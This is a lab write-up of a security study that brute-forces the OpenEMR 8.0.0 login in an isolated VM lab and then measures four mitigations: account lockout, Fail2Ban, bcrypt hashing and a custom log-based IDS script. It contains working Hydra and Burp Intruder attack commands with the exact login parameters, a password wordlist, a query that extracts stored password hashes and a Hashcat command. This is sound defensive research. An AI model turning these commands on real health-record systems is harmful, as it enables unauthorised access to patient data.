# Lab 04 — OpenEMR Brute-Force Attack & Layered Mitigation Research

> **Research Question:** Can encryption and access-control mechanisms in a patient management system be designed and monitored to resist and detect brute-force attacks on patient data?

---

## Overview

This is a research-grade penetration testing project targeting **OpenEMR 8.0.0** — an open-source Electronic Health Record (EHR) system. The study follows a scientific methodology: establishing a baseline (unprotected) attack, then incrementally applying mitigations and retesting to measure each control's effectiveness.

The theoretical framework is **Routine Activity Theory (RAT)** from criminology, applied to cybersecurity:
- **Motivated Offender** → Automated brute-force tool (Hydra / Burp Suite)
- **Suitable Target** → Unconstrained login endpoint
- **Absence of Capable Guardian** → No lockout, no rate limiting, no detection

Each mitigation layer adds a new "capable guardian," progressively neutralising the attack.

---

## Lab Architecture

```
┌─────────────────────────┐   NAT-Only Network   ┌──────────────────────────┐
│ Ubuntu Linux (Target)   │◄────────────────────►│ Kali Linux (Attacker)    │
│ OpenEMR 8.0.0           │   192.168.106.0/24   │ Hydra / Burpsuite        │
│ IP: 192.168.106.131     │                      │ IP: 192.168.106.134      │
└─────────────────────────┘                      └──────────────────────────┘
```

---

## Virtual Machines

| Role | OS | IP Address | Tools |
|------|----|------------|-------|
| Target | Ubuntu Server 22.04.5 + OpenEMR 8.0.0 | 192.168.106.131 | Apache, MariaDB, PHP 8.2 |
| Attacker | Kali Linux 2025.x | 192.168.106.134 | Hydra, Burp Suite, Hashcat |

---

## Phase 1 — LAMP Stack Setup (Ubuntu Target)

### Step 1: Update System & Install Dependencies

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install Apache
sudo apt install apache2 -y

# Install MariaDB (recommended for OpenEMR 8.0.0)
sudo apt install mariadb-server mariadb-client -y

# Install PHP 8.2 with all required OpenEMR extensions
sudo apt install php8.2 php8.2-mysql php8.2-curl php8.2-gd \
  php8.2-xml php8.2-mbstring php8.2-zip php8.2-soap \
  php8.2-intl php8.2-bcmath php8.2-ldap libapache2-mod-php8.2 -y

# Verify
php -v
systemctl status apache2
systemctl status mariadb
```

### Step 2: Secure MariaDB

```bash
sudo mysql_secure_installation
# Set root password: YES → set strong password
# Remove anonymous users: YES
# Disallow remote root login: YES
# Remove test database: YES
# Reload privilege tables: YES
```

### Step 3: Create OpenEMR Database

```sql
sudo mysql -u root -p

CREATE DATABASE openemr CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;
CREATE USER 'openemr'@'localhost' IDENTIFIED BY 'OpenEMR@2026!';
GRANT ALL PRIVILEGES ON openemr.* TO 'openemr'@'localhost';
FLUSH PRIVILEGES;
EXIT;
```

### Step 4: Configure PHP for OpenEMR

```bash
sudo nano /etc/php/8.2/apache2/php.ini
```

**Required settings:**
```ini
short_open_tag = Off
display_errors = Off
log_errors = On
max_execution_time = 60
max_input_time = -1
max_input_vars = 3000
post_max_size = 30M
upload_max_filesize = 30M
memory_limit = 512M
file_uploads = On
```

```bash
sudo systemctl restart apache2
```

---

## Phase 2 — Install OpenEMR 8.0.0

### Step 5: Download & Extract

```bash
cd /tmp

# Download OpenEMR 8.0.0
wget https://sourceforge.net/projects/openemr/files/OpenEMR%20Current/8.0.0/openemr-8.0.0.tar.gz

# Verify MD5 checksum (expected: 71d5c785dbb6ac7068554fd6492fdf0e)
md5sum openemr-8.0.0.tar.gz

# Extract
tar -xzf openemr-8.0.0.tar.gz
```

### Step 6: Deploy to Web Root

```bash
# Move to Apache root
sudo mv openemr-8.0.0 /var/www/html/openemr

# Set ownership and permissions
sudo chown -R www-data:www-data /var/www/html/openemr
sudo find /var/www/html/openemr -type d -exec chmod 755 {} \;
sudo find /var/www/html/openemr -type f -exec chmod 644 {} \;
```

### Step 7: Apache Virtual Host

```bash
sudo nano /etc/apache2/sites-available/openemr.conf
```

```apache
<VirtualHost *:80>
    ServerName 192.168.56.10
    DocumentRoot /var/www/html/openemr
    <Directory /var/www/html/openemr>
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>
    ErrorLog ${APACHE_LOG_DIR}/openemr_error.log
    CustomLog ${APACHE_LOG_DIR}/openemr_access.log combined
</VirtualHost>
```

```bash
sudo a2ensite openemr.conf
sudo a2enmod rewrite
sudo systemctl reload apache2
```

### Step 8: Web Setup Wizard

Navigate to: `http://192.168.106.131/openemr`

1. Verify file/directory permissions → Proceed to Step 1
2. Select "Have setup create the database" → Proceed to Step 2
3. Enter DB credentials: SQL user = `NUA-admin-82`, Root password, Initial User Password
4. Click "Create DB and User"
5. Configure access controls and theme
6. Note login credentials — save this screen

---

## Phase 3 — Pre-Mitigation Baseline (Unprotected Attack)

> All default mitigations disabled to record baseline vulnerability data.

### Step 9: Disable OpenEMR Built-in Lockout (Baseline Configuration)

`OpenEMR → Admin → Config → Security tab:`

```
Maximum Failed Login Attempts For User:                 0 (unlimited)
Time (seconds) to Reset Maximum Failed Login Attempts:  0
Maximum Failed Login Attempts From IP Address:           0
Time to Reset Maximum Failed Login Attempts From IP:     0
```

**Label this state:** "Unprotected Baseline Configuration"

---

### Step 10: Intercept Login Request with Burp Suite

**Purpose:** Identify the exact HTTP POST parameter names (`authUser`, `clearPass`) that attack tools need.

**What it proves:**
- Attackers can passively enumerate authentication parameters via HTTP interception
- Login form transmits credentials in readable format over HTTP

**Walkthrough:**

```
Applications → Web Application Analysis → burpsuite
```

1. Proxy → Intercept → **Intercept is ON**
2. Firefox → Preferences → Network Settings → Manual Proxy: `127.0.0.1:8080`
3. Navigate to `http://192.168.106.131/openemr` and attempt login
4. In Burp, observe intercepted POST request

**Credentials used for interception test:**
- Username: `admin`
- Password: `wrongpassword`

**Captured POST Parameters:**
```
POST /openemr/interface/login/login.php?site=default HTTP/1.1
...
new_login_session_management=1&languageChoice=1&authUser=admin&clearPass=wrongpassword&languageChoice=1
```

**Key findings:**
- Form action path → `/openemr/interface/login/login.php`
- Username field → `authUser`
- Password field → `clearPass`

---

### Step 11: Prepare the Wordlist

**Purpose:** Create a targeted wordlist for dictionary-based attack simulation.

```bash
# Kali has rockyou pre-installed
sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null

# Create focused research wordlist
cat > ~/research_wordlist.txt << 'EOF'
admin
password
123456
wareez
wareezwareez
wareez12345
openemr
Patient01
Admin@123
letmein
admin123
Welcome1
password123
Pass@2026
OpenEMR2026
EOF

# Verify
cat ~/research_wordlist.txt
```

**Research finding:** A small, targeted wordlist (15 entries) based on system context is sufficient to crack weak credentials — demonstrating that users who choose system-related or predictable passwords create significant vulnerability even when other controls exist.

---

### Step 12: Execute Brute-Force with Hydra (Baseline)

**Purpose:** Simulate an external threat actor attempting unauthorised access to patient records.

**Command (Kali):**
```bash
hydra -l NUA-admin-82 \
  -P ~/research_wordlist.txt \
  192.168.106.131 \
  http-post-form \
  "/openemr/interface/login/login.php:authUser=^USER^&clearPass=^PASS^&languageChoice=1:Invalid" \
  -V -t 5 -w 2 \
  -o ~/hydra_baseline_results.txt
```

**Attack Configuration:**

| Parameter | Value |
|-----------|-------|
| Tool | Hydra v9.5 |
| Target | 192.168.106.131:80 |
| Username | NUA-admin-82 |
| Wordlist | ~/research_wordlist.txt (15 entries) |
| Endpoint | /openemr/interface/login/login.php |
| Parameters | authUser=^USER^ & clearPass=^PASS^ |
| Fail string | "Invalid" |
| Threads | 5 parallel |
| Duration | 1 second (13:26:19 → 13:26:20) |

**Results:**

| # | Password Tried | Result |
|---|---------------|--------|
| 1 | admin | False positive |
| 2 | password | False positive |
| 3 | 123456 | False positive |
| 4 | wareez | False positive |
| 5 | wareezwareez | **Correct password** |

**Analysis:** Hydra reported 5 "valid" passwords, but only `wareezwareez` was genuinely successful. The 4 false positives arose because OpenEMR returns HTTP 200 on failed logins (with a JavaScript redirect to `login_screen.php?error=1`) rather than a 4xx error. Hydra detected all non-"Invalid" 200 responses as successes.

**Core finding:** Without any brute-force mitigations, the correct administrative credential was identified in **under 1 second** — with no lockout, no alert, and no resistance.

---

### Step 13: Cross-Validate with Burp Suite Intruder (Baseline)

**Purpose:** Independently confirm Hydra findings using a second tool.

**Method:**
1. Intercept login request → Forward to Intruder
2. Mark `wareezwareez` in `clearPass` field as payload position (`§wareezwareez§`)
3. Attack type: Sniper | Payload: 15-entry research wordlist
4. Launch attack

**Baseline Results Table:**

| Request | Payload | Status Code | Length |
|---------|---------|-------------|--------|
| 0 (baseline) | — | 302 | 601 |
| 1 | admin | 200 | 896 |
| 2 | password | 200 | 899 |
| 3 | 123456 | 200 | 896 |
| 4 | wareez | 200 | 903 |
| **5** | **wareezwareez** | **302** | **604** |
| 6–15 | others | 200 | 896–905 |

**Key evidence:** Only `wareezwareez` returned HTTP 302 (redirect to authenticated dashboard) with a distinct response length (604 bytes vs. 896–905 bytes for failures).

**Response for correct credential:**
```
HTTP/1.1 302 Found
Location: /interface/main/tabs/main.php?token_main=[session_token]
Set-Cookie: OpenEMR=[authenticated session]; SameSite=Strict
```

**Phase 3 Conclusion:** Without mitigations, OpenEMR's login endpoint offered **zero resistance** to dictionary-based brute-force. Under RAT: motivated offender (Hydra) + suitable target (unconstrained endpoint) + absent guardian (no controls) = successful attack in seconds.

---

## Phase 4 — Incremental Mitigations & Retesting

---

### Mitigation 1 — Account Lockout & Rate Limiting (OpenEMR Native)

**Purpose:** Limit login attempts before account lockout — directly interrupting the brute-force attempt volume.

**RAT Mapping:** Introduces the **capable guardian** — the account is no longer freely accessible after repeated failures.

**Configuration:**

`OpenEMR → Admin → Config → Security:`

```
Maximum Failed Login Attempts For User:                  5
Time to Reset Failed Login Attempts For User (seconds): 300
Maximum Failed Login Attempts From IP Address:           5
Time to Reset Failed Login Attempts From IP (seconds):  300
```

**Hydra Rerun After Lockout:**
```bash
hydra -l NUA-admin-82 \
  -P ~/research_wordlist.txt \
  192.168.106.131 \
  http-post-form \
  "/openemr/interface/login/login.php:authUser=^USER^&clearPass=^PASS^&languageChoice=1:Invalid" \
  -V -t 5 -w 2 \
  -o ~/hydra_baseline_results.txt
```
*Result: Hydra stalled. No credential identified. Correct password at position 5 never reached within a single attack window.*

**Burp Suite Intruder Rerun Results (after lockout):**

| Request | Payload | Status Code | Length |
|---------|---------|-------------|--------|
| 0 | (baseline) | 200 | 913 |
| 1–15 | all passwords | 200 | 912–916 |

*All 15 requests — including `wareezwareez` — returned identical HTTP 200 responses. No HTTP 302 observed. No session cookie issued.*

**Analysis:** Account lockout eliminated the distinguishing HTTP 302 signal entirely. Even the correct credential produced an identical response to all incorrect ones — operationally impossible for the attacker to identify success. Under RAT: first capable guardian introduced.

**Limitation:** Account lockout operates at the application layer only — it does not prevent the attacker from consuming server resources or attacking other usernames.

---

### Mitigation 2 — Fail2Ban (System-Level IP Banning)

**Purpose:** Operate at the network/OS level to ban the attacker's IP entirely after threshold is reached — blocking all requests regardless of username.

**Why this extends beyond account lockout:** Account lockout blocks the account. Fail2Ban blocks the attacker's machine — even multi-username attacks are stopped.

**RAT Mapping:** Removes the **motivated offender's network-level access** — attacker needs a new IP to resume any activity.

#### Step A: Install & Enable Fail2Ban

```bash
sudo apt update
sudo apt install fail2ban -y
sudo systemctl enable fail2ban
sudo systemctl start fail2ban
```

#### Step B: Create Custom Filter and Configure Jail

```bash
# Create custom OpenEMR filter
sudo nano /etc/fail2ban/filter.d/openemr.conf
```

```ini
[Definition]
failregex = ^<HOST> .*POST .*login\.php.* 200
ignoreregex =
```

```bash
# Create local config
sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local
sudo nano /etc/fail2ban/jail.local
```

**Find `[apache-auth]` and configure:**
```ini
[openemr]
enabled = true
port = http,https
filter = openemr
logpath = /var/log/apache2/access.log
maxretry = 5
findtime = 60
bantime = 600
```

#### Step C: Restart Fail2Ban

```bash
sudo systemctl restart fail2ban

# Verify jails are active
sudo fail2ban-client status
sudo fail2ban-client status apache-auth
```

#### Step D: Rerun Attack from Kali

```bash
hydra -l NUA-admin-82 -P research_wordlist.txt 192.168.106.131 http-post-form \
  "/openemr/interface/login/login.php:authUser=^USER^&clearPass=^PASS^:Invalid"
```

#### Step E: Confirm IP Ban

```bash
# On Ubuntu target
sudo fail2ban-client status openemr
sudo iptables -L
```

**Confirmed:**
```
- Currently banned: 1
- Banned IP list: 192.168.106.134
```

**iptables chain:**
```
Chain f2b-openemr (1 references)
target    prot opt source         destination
REJECT    tcp  --  192.168.106.134  anywhere   reject-with icmp-port-unreachable
```

**Analysis:** After 5 POST attempts, Fail2Ban inserted the attacker's IP into the `f2b-openemr` iptables chain. All subsequent requests from Kali were dropped at the firewall level — the Apache process never received them. Under RAT: second capable guardian — network-level barrier.

---

### Mitigation 3 — bcrypt Password Encryption

**Purpose:** Ensure that even if an attacker bypasses authentication and accesses the database directly (e.g., via SQL injection), stolen password hashes cannot be reversed within a practical timeframe.

**RAT Mapping:** Last line of capable guardianship — the motivated offender reaches the target (raw credential data) but the absence of feasible cracking capability neutralises the attack.

#### Step A: Access MySQL Database

```bash
mysql -u root
```

```sql
SHOW DATABASES;
USE openemr;
SELECT username, password FROM users;
```

#### Step B: Locate Secure Passwords Table

```sql
SHOW TABLES;
-- Look for: users_secure

SELECT username, password FROM users_secure;
```

**Extracted hash:**

| Username | Password Hash |
|----------|--------------|
| NUA-admin-82 | `$2y$10$nu1Vrjx6D2pe0us8CTgV7u1smkP5P5yz8boRcUnjcZJSF63J2xZSy` |

The `$2y$10$` prefix identifies this as bcrypt with a cost factor of 10.

#### Step C: Prepare Hash for Hashcat

```bash
# Replace $2y$ with $2a$ (Hashcat requirement)
# Final hash:
# $2a$10$nu1Vrjx6D2pe0us8CTgV7u1smkP5P5yz8boRcUnjcZJSF63J2xZSy
```

#### Step D: Save Hash File

```bash
nano hash.txt
# Paste: $2a$10$nu1Vrjx6D2pe0us8CTgV7u1smkP5P5yz8boRcUnjcZJSF63J2xZSy
```

#### Step E: Run Hashcat

```bash
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

**Result:** Hashcat initialised on CPU (no GPU in VM environment). Immediately reported severely constrained throughput. Process terminated due to insufficient allocatable device memory for full GPU acceleration.

**Comparison:**

| Algorithm | Speed (same hardware) | Practical cracking feasibility |
|-----------|----------------------|-------------------------------|
| MD5 | Hundreds of millions/sec | Trivially crackable |
| SHA-1 | Tens of millions/sec | Crackable within hours |
| **bcrypt cost=10** | **~dozens/sec** | **Computationally infeasible** |

**Analysis:** bcrypt cost factor 10 reduces hash throughput by many orders of magnitude. Even with the correct password in the wordlist, cracking is computationally infeasible within any meaningful timeframe. Under RAT: bcrypt neutralises the final attack vector even when all other controls are bypassed.

---

### Mitigation 4 — Real-Time IDS Script (Custom Monitoring)

**Purpose:** Detect ongoing brute-force attacks in real time and generate forensic alerts — independent of whether upstream controls block the attack.

**RAT Mapping:** Most visible expression of capable guardianship — removes the attacker's anonymity and creates an evidentiary trail for incident response.

**Regulatory significance:** In healthcare environments, this alert record triggers HIPAA breach notification assessment and mandatory incident response workflows.

#### Step A: Create the IDS Script

```bash
sudo nano /usr/local/bin/openemr_ids.sh
```

```bash
#!/bin/bash
# OpenEMR Real-Time IDS Monitor
# Purpose: Detect brute-force login attempts from Apache logs

LOG_FILE="/var/log/apache2/access.log"
ALERT_LOG="/var/log/openemr_ids_alerts.log"
THRESHOLD=5
WINDOW=60
CHECK_INTERVAL=10
PID_FILE="/var/run/openemr_ids.pid"

sudo touch "$ALERT_LOG"
sudo chmod 644 "$ALERT_LOG"
echo $$ > "$PID_FILE"

echo "[$(date '+%Y-%m-%d %H:%M:%S')] INFO: OpenEMR IDS Monitor started. Watching $LOG_FILE" | tee -a "$ALERT_LOG"
echo "[$(date '+%Y-%m-%d %H:%M:%S')] INFO: Threshold: $THRESHOLD attempts in ${WINDOW}s | Check interval: ${CHECK_INTERVAL}s" | tee -a "$ALERT_LOG"

declare -A ALERTED_IPS

while true; do
  CUTOFF=$(date -d "-${WINDOW} seconds" "+%d/%b/%Y:%H:%M:%S")

  awk -v cutoff="$CUTOFF" '
  /POST.*login\.php/ {
    match($0, /\[([0-9]{2}\/[A-Za-z]{3}\/[0-9]{4}:[0-9]{2}:[0-9]{2}:[0-9]{2})/, arr)
    if (arr[1] >= cutoff) { print $1 }
  }' "$LOG_FILE" 2>/dev/null | sort | uniq -c | while read COUNT IP; do
    if [ -n "$IP" ] && [ "$COUNT" -ge "$THRESHOLD" ]; then
      TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
      ALERT_KEY="${IP}_${COUNT}"
      if [ "${ALERTED_IPS[$ALERT_KEY]}" != "1" ]; then
        ALERT_MSG="[$TIMESTAMP] *** BRUTE-FORCE ALERT *** Source IP: $IP | Attempts: $COUNT in last ${WINDOW}s | Endpoint: /openemr/interface/login/login.php | Severity: HIGH"
        echo "$ALERT_MSG" | tee -a "$ALERT_LOG"
        ALERTED_IPS[$ALERT_KEY]=1
        echo "[$TIMESTAMP] STRUCTURED: ip=$IP attempts=$COUNT window=${WINDOW}s threshold=$THRESHOLD action=ALERT" >> "$ALERT_LOG"
      fi
    fi
  done
  sleep "$CHECK_INTERVAL"
done
```

#### Step B: Make Executable

```bash
sudo chmod +x /usr/local/bin/openemr_ids.sh
```

#### Step C: Create systemd Service

```bash
sudo nano /etc/systemd/system/openemr-ids.service
```

```ini
[Unit]
Description=OpenEMR Real-Time IDS Brute-Force Monitor
After=network.target apache2.service

[Service]
Type=simple
ExecStart=/usr/local/bin/openemr_ids.sh
Restart=on-failure
RestartSec=5
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
```

#### Step D: Enable and Start

```bash
sudo systemctl daemon-reload
sudo systemctl enable openemr-ids
sudo systemctl start openemr-ids

# Verify
sudo systemctl status openemr-ids
cat /var/log/openemr_ids_alerts.log
```

**Expected output:**
```
[2026-04-12 02:19:00] INFO: OpenEMR IDS Monitor started. Watching /var/log/apache2/access.log
[2026-04-12 02:19:00] INFO: Threshold: 5 attempts in 60s | Check interval: 10s
```

#### Step E: Rerun Attack & Observe Real-Time Alert

```bash
# On Kali — launch attack
hydra -l NUA-admin-82 \
  -P ~/research_wordlist.txt \
  192.168.106.131 \
  http-post-form \
  "/openemr/interface/login/login.php:authUser=^USER^&clearPass=^PASS^&languageChoice=1:Invalid" \
  -V -t 5 -w 2
```

```bash
# On Ubuntu — watch alerts in real time
sudo tail -f /var/log/openemr_ids_alerts.log
```

**Alert generated (within 10–20 seconds of attack start):**
```
[2026-04-12 02:22:44] *** BRUTE-FORCE ALERT *** Source IP: 192.168.106.134 | Attempts: 15 in last 60s | Endpoint: /openemr/interface/login/login.php | Severity: HIGH
[2026-04-12 02:22:44] STRUCTURED: ip=192.168.106.134 attempts=15 window=60s threshold=5 action=ALERT
```

**Results:**
- IDS detected brute-force within ≤10 seconds of threshold being crossed
- Alert recorded: attacker IP, timestamp, attempt count, targeted endpoint
- Alert persisted in `/var/log/openemr_ids_alerts.log` as forensic record
- Record survives system reboot

---

## Final Results Summary

| Mitigation | Layer | Effect on Attack | RAT Role |
|-----------|-------|------------------|---------|
| None (Baseline) | — | Credential cracked in 1 second | No guardian |
| Account Lockout | Application | HTTP 302 signal eliminated; correct password indistinguishable | Guardian 1 |
| Fail2Ban | Network/OS | Attacker IP banned after 5 attempts; all further requests dropped | Guardian 2 |
| bcrypt (cost=10) | Database | Hash computationally infeasible to crack even with correct wordlist | Guardian 3 |
| IDS Monitor | Detection/Audit | Attack detected in ≤10 seconds; forensic record created | Guardian 4 |

**Combined defence posture:** Brute-force attacks are simultaneously **prevented** (lockout), **blocked** (Fail2Ban), **computationally neutralised** (bcrypt), and **forensically recorded** (IDS).

---

## Tools Reference

| Tool | Version | Purpose |
|------|---------|---------|
| Hydra | v9.5 | HTTP POST brute-force attack |
| Burp Suite Community | v2025.7.4 | Traffic interception, Intruder attack module |
| Hashcat | v6.2.6 | bcrypt hash cracking attempt (mode 3200) |
| Fail2Ban | — | Automated IP banning via iptables |
| Custom IDS Script | — | Real-time brute-force detection + forensic logging |
| OpenEMR | 8.0.0 | Target: Electronic Health Record web application |
| MariaDB | 10.6.x | Database for bcrypt hash extraction |

---

## Research Framework

**Theoretical basis:** Routine Activity Theory (Cohen & Felson, 1979) applied to cybersecurity

> "A criminal act requires the convergence in space and time of a motivated offender, a suitable target, and the absence of a capable guardian."

This study demonstrates empirically that each mitigation layer corresponds directly to introducing a capable guardian, progressively eliminating the conditions for a successful attack.
